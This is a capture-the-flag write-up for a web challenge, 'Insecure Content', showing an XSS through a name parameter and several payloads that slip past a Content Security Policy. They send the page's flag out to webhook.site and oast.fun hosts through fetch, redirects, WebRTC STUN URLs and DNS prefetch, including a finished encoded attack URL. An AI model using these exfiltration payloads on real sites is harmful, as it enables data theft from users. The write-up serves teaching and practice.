---
title: Insecure Content
date: 2024-11-24
tags: 
- web
- csp
- author-hartmannsyg
categories: BlahajCTF 2024
---

by {% person hartmannsyg %}

> Secure Content was secure, but this time its more (less) secure!

This challenge was written as a spinoff of another challenge called <u>**Secure Content**</u>, which also another Content Security Policy (CSP) challenge. It's supposed to be less secure (and hence easier) than Secure Content, but the description sounds like it is a sequel which was a mistake on my part.

## The attack surface

In the source code given, we see that we can just arbitrarily attack with raw html via `name` - this is a straight up xss with no restrictions.

{% ccb lang:py gutter1:25-41 caption:app.py %}
def generatenamepage(name):
    return """<!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Hello!</title>
        
    </head>
    <body>
        <div>
            <h1>Hello, """+name+"""!</h1>
            <p>I hope you like flags! In fact, here is a flag: blahaj{[FLAG REDACTED]}</p>
            <p>Sadly, only the admin bot can see it :'(</p>
        </div>
    </body>
    </html>"""
{% endccb %}

However, we have a CSP in place:

{% ccb lang:py gutter1:8-24 caption:app.py %}
def apply_csp(response: Response) -> Response:
    csp = (
        "connect-src 'none'; "
        "font-src 'none'; "
        "frame-src 'none'; "
        "img-src 'self'; "
        "manifest-src 'none'; "
        "media-src 'none'; "
        "object-src 'none'; "
        "worker-src 'none'; "
        "style-src 'self'; "
        "frame-ancestors 'none'; "
        "block-all-mixed-content;"
        "require-trusted-types-for 'script';"
    )
    response.headers['Content-Security-Policy'] = csp
    return response
{% endccb %}

Note that we are missing `script-src`, which allows for arbitrary execution of `<script></script>` blocks.

We immediately have a few things to try:

### Send a request

```js
window.onload = () => {
    const flag = document.querySelector("p").innerText.substring(48);
    fetch('https://webhook.site/ac2ef8aa-906a-4ba2-9834-218616911e3c/'+flag)
}
```

{% ccb terminal:true html:true wrapped:true %}
<span style="background-color: rgba(255, 0, 0, 0.1); color: rgb(255, 200, 200)">Refused to connect to 'https://webhook.site/ac2ef8aa-906a-4ba2-9834-218616911e3c/blahaj%7B[FLAG%20REDACTED]%7D' because it violates the following Content Security Policy directive: "connect-src 'none'".</span>
{% endccb %}

### Redirects

```js
window.onload = () => {
    const flag = document.querySelector("p").innerText.substring(48);
    window.location = 'https://webhook.site/ac2ef8aa-906a-4ba2-9834-218616911e3c/'+flag
}
```

CSP does not block redirects (the [navigate-to](https://content-security-policy.com/navigate-to/) directive is not supported by any browser). 

<details>
<summary>However, the admin bot that runs puppeteer blocks cross-origin redirects</summary>
{% ccb lang:js gutter1:15-28 caption:admin.js %}
    // blocks cross-origin redirects
    await page.setRequestInterception(true);

    page.on('request', request => {
        requestURLObj = new URL(request.url())
        if (request.isNavigationRequest() && (requestURLObj.origin != urlObj.origin)) {
          request.abort();
          console.log('uh oh')
          console.log(requestURLObj)
        } else {
            console.log('all good')
            request.continue();
        }
    });
{% endccb %}

</details>

## CSP bypasses

With this, there are two possible solutions:

1. DNS prefetch
2. WebRTC

DNS prefetch does not work on headless, and our admin bot (puppeteer) is being run headless by default. This leaves exfiltration via WebRTC urls:

```js
window.onload = () => {
    let data = 'data'
    let e = new RTCPeerConnection({ iceServers: [{ urls: ["stun:"+data+".zrekefudcwgdnisxolob95nwy11uq3ho7.oast.fun"] }] }); 
    e.createDataChannel(""); 
    e.createOffer().then(r => e.setLocalDescription(r)) 
};
```

To receive this request, we need something to get out-of-band interactions. I am using https://app.interactsh.com/ to receive these WebRTC requests.

The problem with this method is that the urls can only contain lowercase numbers and letters. (There is also a length restriction but I am not evil enough to make the flag so long that you encounter this)

Anyways, I opted to encode the flag as base64, then convert uppercase letters into 2 lowercase letters, and then ship it to the oast url:

```js
window.onload = () => { 
    let data = btoa(document.querySelector("p").innerText.substring(48)); 
    let newdata = data.split("").map((c) => {     
        if (!isNaN(c)) {return c;}     
        else if (c == c.toUpperCase()) {return c.toLowerCase() + c.toLowerCase();}     
        else {return c;} 
    }); 
    let ex = newdata.join("").replaceAll("=",""); 
    let e = new RTCPeerConnection({ iceServers: [{ urls: ["stun:"+ex+".zrekefudcwgdnisxolob95nwy11uq3ho7.oast.fun"] }] }); 
    e.createDataChannel(""); e.createOffer().then(r => e.setLocalDescription(r)) 
}
```

With this we can condense it to a URL paylaod to report to the admin bot (JS minify + `encodeURI()`):

{% ccb wrapped:true terminal:true %}
http://127.0.0.1:8000/greet?name=%3Cscript%3Ewindow.addEventListener%28%22load%22%2C+%28%29+%3D%3E+%7B+let+data+%3D+btoa%28document.querySelector%28%22p%22%29.innerText.substring%2848%29%29%3B+let+newdata+%3D+data.split%28%22%22%29.map%28%28c%29+%3D%3E+%7B+++++if+%28%21isNaN%28c%29%29+%7Breturn+c%3B%7D+++++else+if+%28c+%3D%3D+c.toUpperCase%28%29%29+%7Breturn+c.toLowerCase%28%29+%2B+c.toLowerCase%28%29%3B%7D+++++else+%7Breturn+c%3B%7D+%7D%29%3B+let+ex+%3D+newdata.join%28%22%22%29.replaceAll%28%22%3D%22%2C%22%22%29%3B+console.log%28ex%29%3B+let+e+%3D+new+RTCPeerConnection%28%7B+iceServers%3A+%5B%7B+urls%3A+%5B%22stun%3A%22%2Bex%2B%22.zrekefudcwgdnisxolob95nwy11uq3ho7.oast.fun%22%5D+%7D%5D+%7D%29%3B+e.createDataChannel%28%22%22%29%3B+e.createOffer%28%29.then%28r+%3D%3E+e.setLocalDescription%28r%29%29+%7D%29%3B%3C%2Fscript%3E
{% endccb %}

## Extra

<details>
<summary>How would a DNS prefetch exploit look like?</summary>

```js
window.onload = () => {
    const linkEl = document.createElement("link"); 
    linkEl.rel = "prefetch"; 
    let data = btoa(document.querySelector("p").innerText.substring(48)); 
    let newdata = data.split("").map((c) => {     
        if (!isNaN(c)) {return c;}     
        else if (c == c.toUpperCase()) {return c.toLowerCase() + c.toLowerCase();}     
        else {return c;} 
    }); 
    let ex = newdata.join("").replaceAll("=",""); 
    linkEl.href = `http://${ex}.zrekefudcwgdnisxolob95nwy11uq3ho7.oast.fun`; 
    document.head.appendChild(linkEl);
}
```
</details>